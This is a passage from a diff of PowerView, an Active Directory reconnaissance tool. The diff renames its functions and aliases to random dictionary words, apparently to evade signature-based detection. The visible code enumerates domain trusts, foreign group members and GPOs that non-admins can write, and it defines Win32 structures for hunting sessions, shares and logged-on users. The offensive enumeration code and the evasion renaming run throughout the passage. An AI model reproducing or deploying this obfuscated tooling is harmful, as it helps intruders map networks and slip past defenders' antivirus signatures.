-            $BBaSdAsr99 = $puEJpQFm99.SubString($puEJpQFm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+        $ExcludeGroups = @('Users', 'Domain Users', 'Guests')
+        typing @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
+            $GroupName = $_.samAccountName
+            $GroupDistinguishedName = $_.distinguishedname
+            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
             $_.member | ForEach-Object {
-                $uuoLoDkc99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($BBaSdAsr99 -ne $uuoLoDkc99)) {
-                    $sJRtMfdS99 = $_
-                    $jKgysTLK99 = $_.Split(',')[0].split('=')[1]
-                    $dogbYkZX99 = New-Object PSObject
-                    $dogbYkZX99 | Add-Member Noteproperty 'GroupDomain' $BBaSdAsr99
-                    $dogbYkZX99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
-                    $dogbYkZX99 | Add-Member Noteproperty 'GroupDistinguishedName' $puEJpQFm99
-                    $dogbYkZX99 | Add-Member Noteproperty 'MemberDomain' $uuoLoDkc99
-                    $dogbYkZX99 | Add-Member Noteproperty 'MemberName' $jKgysTLK99
-                    $dogbYkZX99 | Add-Member Noteproperty 'MemberDistinguishedName' $sJRtMfdS99
-                    $dogbYkZX99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
-                    $dogbYkZX99
+                $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($GroupDomain -ne $MemberDomain)) {
+                    $MemberDistinguishedName = $_
+                    $MemberName = $_.Split(',')[0].split('=')[1]
+                    $ForeignGroupMember = New-Object PSObject
+                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDomain' $GroupDomain
+                    $ForeignGroupMember | Add-Member Noteproperty 'GroupName' $GroupName
+                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupDistinguishedName
+                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
+                    $ForeignGroupMember | Add-Member Noteproperty 'MemberName' $MemberName
+                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDistinguishedName
+                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
+                    $ForeignGroupMember
                 }
             }
         }
     }
 }
-function sow {
+function fumbler {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.DomainTrust.NET')]
     [OutputType('PowerView.DomainTrust.LDAP')]
@@ -9967,134 +9967,134 @@ function sow {
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [Parameter(ParameterSetName = 'LDAP')]
         [Parameter(ParameterSetName = 'API')]
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Parameter(ParameterSetName = 'LDAP')]
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Parameter(ParameterSetName = 'LDAP')]
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
-    $VuoFrjHb99 = @{}
-    $mwZWbAYE99 = New-Object System.Collections.Stack
-    $mUpijEWQ99 = @{}
-    if ($PSBoundParameters['API']) { $mUpijEWQ99['API'] = $API }
-    if ($PSBoundParameters['NET']) { $mUpijEWQ99['NET'] = $NET }
-    if ($PSBoundParameters['LDAPFilter']) { $mUpijEWQ99['LDAPFilter'] = $HOOTOEqu99 }
-    if ($PSBoundParameters['Properties']) { $mUpijEWQ99['Properties'] = $SdzJuWMG99 }
-    if ($PSBoundParameters['SearchBase']) { $mUpijEWQ99['SearchBase'] = $FNgTGwmR99 }
-    if ($PSBoundParameters['Server']) { $mUpijEWQ99['Server'] = $mSxqoOjK99 }
-    if ($PSBoundParameters['SearchScope']) { $mUpijEWQ99['SearchScope'] = $vaSWXjPs99 }
-    if ($PSBoundParameters['ResultPageSize']) { $mUpijEWQ99['ResultPageSize'] = $mhcqrrQn99 }
-    if ($PSBoundParameters['ServerTimeLimit']) { $mUpijEWQ99['ServerTimeLimit'] = $mvTbAWDU99 }
-    if ($PSBoundParameters['Tombstone']) { $mUpijEWQ99['Tombstone'] = $rPozaKft99 }
-    if ($PSBoundParameters['Credential']) { $mUpijEWQ99['Credential'] = $gxazvivN99 }
+    $SeenDomains = @{}
+    $Domains = New-Object System.Collections.Stack
+    $DomainTrustArguments = @{}
+    if ($PSBoundParameters['API']) { $DomainTrustArguments['API'] = $API }
+    if ($PSBoundParameters['NET']) { $DomainTrustArguments['NET'] = $NET }
+    if ($PSBoundParameters['LDAPFilter']) { $DomainTrustArguments['LDAPFilter'] = $LDAPFilter }
+    if ($PSBoundParameters['Properties']) { $DomainTrustArguments['Properties'] = $Properties }
+    if ($PSBoundParameters['SearchBase']) { $DomainTrustArguments['SearchBase'] = $SearchBase }
+    if ($PSBoundParameters['Server']) { $DomainTrustArguments['Server'] = $Server }
+    if ($PSBoundParameters['SearchScope']) { $DomainTrustArguments['SearchScope'] = $SearchScope }
+    if ($PSBoundParameters['ResultPageSize']) { $DomainTrustArguments['ResultPageSize'] = $ResultPageSize }
+    if ($PSBoundParameters['ServerTimeLimit']) { $DomainTrustArguments['ServerTimeLimit'] = $ServerTimeLimit }
+    if ($PSBoundParameters['Tombstone']) { $DomainTrustArguments['Tombstone'] = $Tombstone }
+    if ($PSBoundParameters['Credential']) { $DomainTrustArguments['Credential'] = $Credential }
     if ($PSBoundParameters['Credential']) {
-        $XDmTsUoD99 = (debater -Credential $gxazvivN99).Name
+        $CurrentDomain = (southernmost -Credential $Credential).Name
     }
     else {
-        $XDmTsUoD99 = (debater).Name
+        $CurrentDomain = (southernmost).Name
     }
-    $mwZWbAYE99.Push($XDmTsUoD99)
-    while($mwZWbAYE99.Count -ne 0) {
-        $SSNUOPgW99 = $mwZWbAYE99.Pop()
-        if ($SSNUOPgW99 -and ($SSNUOPgW99.Trim() -ne '') -and (-not $VuoFrjHb99.ContainsKey($SSNUOPgW99))) {
-            Write-Verbose "[sow] Enumerating trusts for domain: '$SSNUOPgW99'"
-            $Null = $VuoFrjHb99.Add($SSNUOPgW99, '')
+    $Domains.Push($CurrentDomain)
+    while($Domains.Count -ne 0) {
+        $Domain = $Domains.Pop()
+        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {
+            Write-Verbose "[fumbler] Enumerating trusts for domain: '$Domain'"
+            $Null = $SeenDomains.Add($Domain, '')
             try {
-                $mUpijEWQ99['Domain'] = $SSNUOPgW99
-                $iZLnMGuv99 = cryogenics @DomainTrustArguments
-                if ($iZLnMGuv99 -isnot [System.Array]) {
-                    $iZLnMGuv99 = @($iZLnMGuv99)
+                $DomainTrustArguments['Domain'] = $Domain
+                $Trusts = Kenneth @DomainTrustArguments
+                if ($Trusts -isnot [System.Array]) {
+                    $Trusts = @($Trusts)
                 }
                 if ($PsCmdlet.ParameterSetName -eq 'NET') {
-                    $hknhXjGf99 = @{}
-                    if ($PSBoundParameters['Forest']) { $hknhXjGf99['Forest'] = $ZKthMMjt99 }
-                    if ($PSBoundParameters['Credential']) { $hknhXjGf99['Credential'] = $gxazvivN99 }
-                    $iZLnMGuv99 += victory @ForestTrustArguments
+                    $ForestTrustArguments = @{}
+                    if ($PSBoundParameters['Forest']) { $ForestTrustArguments['Forest'] = $Forest }
+                    if ($PSBoundParameters['Credential']) { $ForestTrustArguments['Credential'] = $Credential }
+                    $Trusts += onion @ForestTrustArguments
                 }
-                if ($iZLnMGuv99) {
-                    if ($iZLnMGuv99 -isnot [System.Array]) {
-                        $iZLnMGuv99 = @($iZLnMGuv99)
+                if ($Trusts) {
+                    if ($Trusts -isnot [System.Array]) {
+                        $Trusts = @($Trusts)
                     }
-                    ForEach ($Trust in $iZLnMGuv99) {
+                    ForEach ($Trust in $Trusts) {
                         if ($Trust.SourceName -and $Trust.TargetName) {
-                            $Null = $mwZWbAYE99.Push($Trust.TargetName)
+                            $Null = $Domains.Push($Trust.TargetName)
                             $Trust
                         }
                     }
                 }
             }
             catch {
-                Write-Verbose "[sow] Error: $_"
+                Write-Verbose "[fumbler] Error: $_"
             }
         }
     }
 }
-function Masonic {
+function bromides {
     [CmdletBinding()]
     Param (
         [String]
-        $cgXwtZoc99 = '*',
+        $GPOName = '*',
         [ValidateRange(1,10000)] 
         [Int]
-        $nkMakqBA99 = 200
+        $PageSize = 200
     )
-    $HqTCLlkF99 = @('SYSTEM','Domain Admins','Enterprise Admins')
-    $ZKthMMjt99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
-    $dzdXyOpe99 = @($ZKthMMjt99.Domains)
-    $mwZWbAYE99 = $dzdXyOpe99 | foreach { $_.GetDirectoryEntry() }
-    foreach ($SSNUOPgW99 in $mwZWbAYE99) {
-        $kXbEpVCq99 = "(&(objectCategory=groupPolicyContainer)(displayname=$cgXwtZoc99))"
-        $TbkLYEaJ99 = New-Object System.DirectoryServices.DirectorySearcher
-        $TbkLYEaJ99.SearchRoot = $SSNUOPgW99
-        $TbkLYEaJ99.Filter = $kXbEpVCq99
-        $TbkLYEaJ99.PageSize = $nkMakqBA99
-        $TbkLYEaJ99.SearchScope = "Subtree"
-        $WzlkXBNF99 = $TbkLYEaJ99.FindAll()
-        foreach ($gpo in $WzlkXBNF99){
-            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $HqTCLlkF99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
+    $Exclusions = @('SYSTEM','Domain Admins','Enterprise Admins')
+    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+    $DomainList = @($Forest.Domains)
+    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
+    foreach ($Domain in $Domains) {
+        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
+        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
+        $Searcher.SearchRoot = $Domain
+        $Searcher.Filter = $Filter
+        $Searcher.PageSize = $PageSize
+        $Searcher.SearchScope = "Subtree"
+        $listGPO = $Searcher.FindAll()
+        foreach ($gpo in $listGPO){
+            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
         if ($ACL -ne $null){
-            $vIWNwJYm99 = New-Object psobject
-            $vIWNwJYm99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
-            $vIWNwJYm99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
-            $vIWNwJYm99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
-            $vIWNwJYm99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
-            $vIWNwJYm99
+            $GpoACL = New-Object psobject
+            $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
+            $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
+            $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
+            $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
+            $GpoACL
         }
         }
     }
 }
-$Mod = canonical -ModuleName Win32
-$FRRsEGRX99 = chivalrous $Mod PowerView.SamAccountTypeEnum UInt32 @{
+$Mod = spinoff -ModuleName Win32
+$SamAccountTypeEnum = pilgrimage $Mod PowerView.SamAccountTypeEnum UInt32 @{
     DOMAIN_OBJECT                   =   '0x00000000'
     GROUP_OBJECT                    =   '0x10000000'
     NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
@@ -10107,7 +10107,7 @@ $FRRsEGRX99 = chivalrous $Mod PowerView.SamAccountTypeEnum UInt32 @{
     APP_QUERY_GROUP                 =   '0x40000001'
     ACCOUNT_TYPE_MAX                =   '0x7fffffff'
 }
-$RAkiSvHr99 = chivalrous $Mod PowerView.GroupTypeEnum UInt32 @{
+$GroupTypeEnum = pilgrimage $Mod PowerView.GroupTypeEnum UInt32 @{
     CREATED_BY_SYSTEM               =   '0x00000001'
     GLOBAL_SCOPE                    =   '0x00000002'
     DOMAIN_LOCAL_SCOPE              =   '0x00000004'
@@ -10116,7 +10116,7 @@ $RAkiSvHr99 = chivalrous $Mod PowerView.GroupTypeEnum UInt32 @{
     APP_QUERY                       =   '0x00000020'
     SECURITY                        =   '0x80000000'
 } -Bitfield
-$oqUiXgaF99 = chivalrous $Mod PowerView.UACEnum UInt32 @{
+$UACEnum = pilgrimage $Mod PowerView.UACEnum UInt32 @{
     SCRIPT                          =   1
     ACCOUNTDISABLE                  =   2
     HOMEDIR_REQUIRED                =   8
@@ -10140,7 +10140,7 @@ $oqUiXgaF99 = chivalrous $Mod PowerView.UACEnum UInt32 @{
     TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
     PARTIAL_SECRETS_ACCOUNT         =   67108864
 } -Bitfield
-$QUSTEbkG99 = chivalrous $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
+$WTSConnectState = pilgrimage $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
     Active       =    0
     Connected    =    1
     ConnectQuery =    2
@@ -10152,9 +10152,9 @@ $QUSTEbkG99 = chivalrous $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
     Down         =    8
     Init         =    9
 }
-$lqYeGqBq99 = preconceives $Mod PowerView.RDPSessionInfo @{
+$WTS_SESSION_INFO_1 = changeable $Mod PowerView.RDPSessionInfo @{
     ExecEnvId = field 0 UInt32
-    State = field 1 $QUSTEbkG99
+    State = field 1 $WTSConnectState
     SessionId = field 2 UInt32
     pSessionName = field 3 String -MarshalAs @('LPWStr')
     pHostName = field 4 String -MarshalAs @('LPWStr')
@@ -10162,28 +10162,28 @@ $lqYeGqBq99 = preconceives $Mod PowerView.RDPSessionInfo @{
     pDomainName = field 6 String -MarshalAs @('LPWStr')
     pFarmName = field 7 String -MarshalAs @('LPWStr')
 }
-$sKmvEYbz99 = preconceives $mod WTS_CLIENT_ADDRESS @{
+$WTS_CLIENT_ADDRESS = changeable $mod WTS_CLIENT_ADDRESS @{
     AddressFamily = field 0 UInt32
     Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
 }
-$LHsSdVmM99 = preconceives $Mod PowerView.ShareInfo @{
+$SHARE_INFO_1 = changeable $Mod PowerView.ShareInfo @{
     Name = field 0 String -MarshalAs @('LPWStr')
     Type = field 1 UInt32
     Remark = field 2 String -MarshalAs @('LPWStr')
 }
-$AYxUHfXy99 = preconceives $Mod PowerView.LoggedOnUserInfo @{
+$WKSTA_USER_INFO_1 = changeable $Mod PowerView.LoggedOnUserInfo @{
     UserName = field 0 String -MarshalAs @('LPWStr')
     LogonDomain = field 1 String -MarshalAs @('LPWStr')
     AuthDomains = field 2 String -MarshalAs @('LPWStr')
     LogonServer = field 3 String -MarshalAs @('LPWStr')
 }
-$LsQgOFsN99 = preconceives $Mod PowerView.SessionInfo @{
+$SESSION_INFO_10 = changeable $Mod PowerView.SessionInfo @{
     CName = field 0 String -MarshalAs @('LPWStr')
     UserName = field 1 String -MarshalAs @('LPWStr')
     Time = field 2 UInt32
     IdleTime = field 3 UInt32
 }
-$WVIZNIwi99 = chivalrous $Mod SID_NAME_USE UInt16 @{
+$SID_NAME_USE = pilgrimage $Mod SID_NAME_USE UInt16 @{
     SidTypeUser             = 1
     SidTypeGroup            = 2
     SidTypeDomain           = 3
@@ -10194,16 +10194,16 @@ $WVIZNIwi99 = chivalrous $Mod SID_NAME_USE UInt16 @{
     SidTypeUnknown          = 8
     SidTypeComputer         = 9
 }
-$glIboXpK99 = preconceives $Mod LOCALGROUP_INFO_1 @{
+$LOCALGROUP_INFO_1 = changeable $Mod LOCALGROUP_INFO_1 @{
     lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
     lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
 }
-$AAOdZRRi99 = preconceives $Mod LOCALGROUP_MEMBERS_INFO_2 @{
+$LOCALGROUP_MEMBERS_INFO_2 = changeable $Mod LOCALGROUP_MEMBERS_INFO_2 @{
     lgrmi2_sid = field 0 IntPtr
-    lgrmi2_sidusage = field 1 $WVIZNIwi99
+    lgrmi2_sidusage = field 1 $SID_NAME_USE
     lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
 }
-$DsDomainFlag = chivalrous $Mod DsDomain.Flags UInt32 @{
+$DsDomainFlag = pilgrimage $Mod DsDomain.Flags UInt32 @{
     IN_FOREST       = 1
     DIRECT_OUTBOUND = 2
     TREE_ROOT       = 4
@@ -10211,13 +10211,13 @@ $DsDomainFlag = chivalrous $Mod DsDomain.Flags UInt32 @{
     NATIVE_MODE     = 16
     DIRECT_INBOUND  = 32
 } -Bitfield
-$dhhSChGp99 = chivalrous $Mod DsDomain.TrustType UInt32 @{
+$DsDomainTrustType = pilgrimage $Mod DsDomain.TrustType UInt32 @{
     DOWNLEVEL   = 1
     UPLEVEL     = 2
     MIT         = 3
     DCE         = 4
 }
-$tuJeJXLW99 = chivalrous $Mod DsDomain.TrustAttributes UInt32 @{
+$DsDomainTrustAttributes = pilgrimage $Mod DsDomain.TrustAttributes UInt32 @{
     NON_TRANSITIVE      = 1
     UPLEVEL_ONLY        = 2
     FILTER_SIDS         = 4
@@ -10226,17 +10226,17 @@ $tuJeJXLW99 = chivalrous $Mod DsDomain.TrustAttributes UInt32 @{
     WITHIN_FOREST       = 32
     TREAT_AS_EXTERNAL   = 64
 }
-$ZELCewrO99 = preconceives $Mod DS_DOMAIN_TRUSTS @{
+$DS_DOMAIN_TRUSTS = changeable $Mod DS_DOMAIN_TRUSTS @{
     NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
     DnsDomainName = field 1 String -MarshalAs @('LPWStr')
     Flags = field 2 $DsDomainFlag
     ParentIndex = field 3 UInt32
-    TrustType = field 4 $dhhSChGp99
-    TrustAttributes = field 5 $tuJeJXLW99
+    TrustType = field 4 $DsDomainTrustType
+    TrustAttributes = field 5 $DsDomainTrustAttributes
     DomainSid = field 6 IntPtr
     DomainGuid = field 7 Guid
 }
-$hMRxlbGU99 = preconceives $Mod NETRESOURCEW @{
+$NETRESOURCEW = changeable $Mod NETRESOURCEW @{
     dwScope =         field 0 UInt32
     dwType =          field 1 UInt32
     dwDisplayType =   field 2 UInt32
@@ -10267,66 +10267,66 @@ $FunctionDefinitions = @(
     (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
     (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
     (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
-    (func Mpr WNetAddConnection2W ([Int]) @($hMRxlbGU99, [String], [String], [UInt32])),
+    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
     (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
     (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
 )
-$Types = $FunctionDefinitions | counterclaims -Module $Mod -Namespace 'Win32'
-$eIekXKWj99 = $Types['netapi32']
-$hVuDLVbw99 = $Types['advapi32']
-$ppPvwAgU99 = $Types['wtsapi32']
+$Types = $FunctionDefinitions | themselves -Module $Mod -Namespace 'Win32'
+$Netapi32 = $Types['netapi32']
+$Advapi32 = $Types['advapi32']
+$Wtsapi32 = $Types['wtsapi32']
 $Mpr = $Types['Mpr']
 $Kernel32 = $Types['kernel32']
-Set-Alias Get-IPAddress erupt
-Set-Alias Convert-NameToSid gain
-Set-Alias Convert-SidToName woodmen
-Set-Alias Request-SPNTicket stiffens
-Set-Alias Get-DNSZone dunces
-Set-Alias Get-DNSRecord misinterpret
-Set-Alias Get-NetDomain debater
-Set-Alias Get-NetDomainController deplorably
-Set-Alias Get-NetForest ampere
-Set-Alias Get-NetForestDomain employing
-Set-Alias Get-NetForestCatalog spontaneous
-Set-Alias Get-NetUser township
-Set-Alias Get-UserEvent niftiest
-Set-Alias Get-NetComputer doubtlessly
-Set-Alias Get-ADObject farrowing
-Set-Alias Set-ADObject backlashes
-Set-Alias Get-ObjectAcl pols
-Set-Alias Add-ObjectAcl requirements
-Set-Alias Invoke-ACLScanner voile
-Set-Alias Get-GUIDMap fault
-Set-Alias Get-NetOU ivies
-Set-Alias Get-NetSite shoddiness
-Set-Alias Get-NetSubnet pianissimi
-Set-Alias Get-NetGroup burlap
-Set-Alias Find-ManagedSecurityGroups flick
-Set-Alias Get-NetGroupMember strippers
-Set-Alias Get-NetFileServer furloughing
-Set-Alias Get-DFSshare wheezes
-Set-Alias Get-NetGPO roomfuls
-Set-Alias Get-NetGPOGroup factoring
-Set-Alias Find-GPOLocation designation
-Set-Alias Find-GPOComputerAdmin mohair
-Set-Alias Get-LoggedOnLocal deepening
-Set-Alias Invoke-CheckLocalAdminAccess Abelson
-Set-Alias Get-SiteName tussled
-Set-Alias Get-Proxy Amritsar
-Set-Alias Get-LastLoggedOn evangelize
-Set-Alias Get-CachedRDPConnection mosque
-Set-Alias Get-RegistryMountedDrive doughtier
-Set-Alias Get-NetProcess console
-Set-Alias Invoke-ThreadedFunction glorious
-Set-Alias Invoke-UserHunter drinkers
-Set-Alias Invoke-ProcessHunter snowshed
-Set-Alias Invoke-EventHunter Valkyries
-Set-Alias Invoke-ShareFinder Suwanee
-Set-Alias Invoke-FileFinder indignantly
-Set-Alias Invoke-EnumerateLocalAdmin strutting
-Set-Alias Get-NetDomainTrust cryogenics
-Set-Alias Get-NetForestTrust victory
-Set-Alias Find-ForeignUser Syrians
-Set-Alias Find-ForeignGroup Poiret
-Set-Alias Invoke-MapDomainTrust sow
-Set-Alias Get-DomainPolicy monograms
+Set-Alias Get-IPAddress Tuscon
+Set-Alias Convert-NameToSid concurs
+Set-Alias Convert-SidToName armpits
+Set-Alias Request-SPNTicket hereto
+Set-Alias Get-DNSZone mourned
+Set-Alias Get-DNSRecord cookery
+Set-Alias Get-NetDomain southernmost
+Set-Alias Get-NetDomainController Sarto
+Set-Alias Get-NetForest chicaneries
+Set-Alias Get-NetForestDomain surcharge
+Set-Alias Get-NetForestCatalog Jamaican
+Set-Alias Get-NetUser prissier
+Set-Alias Get-UserEvent Alisa
+Set-Alias Get-NetComputer sonorous
+Set-Alias Get-ADObject dermatitis
+Set-Alias Set-ADObject Rena
+Set-Alias Get-ObjectAcl Pearl
+Set-Alias Add-ObjectAcl categorize
+Set-Alias Invoke-ACLScanner Broadway
+Set-Alias Get-GUIDMap accommodated
+Set-Alias Get-NetOU vaporizes
+Set-Alias Get-NetSite our
+Set-Alias Get-NetSubnet unsold
+Set-Alias Get-NetGroup typing
+Set-Alias Find-ManagedSecurityGroups proceeding
+Set-Alias Get-NetGroupMember Aesculapius
+Set-Alias Get-NetFileServer witchery
+Set-Alias Get-DFSshare throwaways
+Set-Alias Get-NetGPO meshed
+Set-Alias Get-NetGPOGroup infantry
+Set-Alias Find-GPOLocation preciseness
+Set-Alias Find-GPOComputerAdmin catastrophic
+Set-Alias Get-LoggedOnLocal millstone
+Set-Alias Invoke-CheckLocalAdminAccess milkshake
+Set-Alias Get-SiteName scrappy
+Set-Alias Get-Proxy graceless
+Set-Alias Get-LastLoggedOn casseroled
+Set-Alias Get-CachedRDPConnection colleagues
+Set-Alias Get-RegistryMountedDrive fixture
+Set-Alias Get-NetProcess frontiersman
+Set-Alias Invoke-ThreadedFunction wingnut
+Set-Alias Invoke-UserHunter rubble
+Set-Alias Invoke-ProcessHunter delivers
+Set-Alias Invoke-EventHunter contrives
+Set-Alias Invoke-ShareFinder symbolization
+Set-Alias Invoke-FileFinder heights
+Set-Alias Invoke-EnumerateLocalAdmin polite
+Set-Alias Get-NetDomainTrust Kenneth
+Set-Alias Get-NetForestTrust onion
+Set-Alias Find-ForeignUser dyer
+Set-Alias Find-ForeignGroup electroencephalograph
+Set-Alias Invoke-MapDomainTrust fumbler
+Set-Alias Get-DomainPolicy undergarment
